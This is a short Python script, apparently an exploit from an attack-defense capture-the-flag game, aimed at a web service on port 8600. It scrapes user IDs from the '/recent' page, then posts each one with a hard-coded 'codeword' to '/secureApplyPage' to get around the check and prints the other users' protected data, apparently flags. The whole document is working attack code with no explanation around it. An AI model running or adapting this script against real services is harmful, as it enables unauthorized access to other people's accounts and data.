#!/usr/bin/env python3

import re
import sys

import requests

ip = sys.argv[1]

r = requests.get(f"http://{ip}:8600/recent")
for user_id in re.findall(r'header">([0-9,]+)<', r.text):
    resp = requests.post(
        f"http://{ip}:8600/secureApplyPage",
        data={
            "enum": user_id.replace(",", ""),
            "codeword": "sitehjeigwpojpoejtpojtpoj"
        },
        allow_redirects=True
    )

    print(re.findall(r'black;">([^<]+)</strong', resp.text), flush=True)
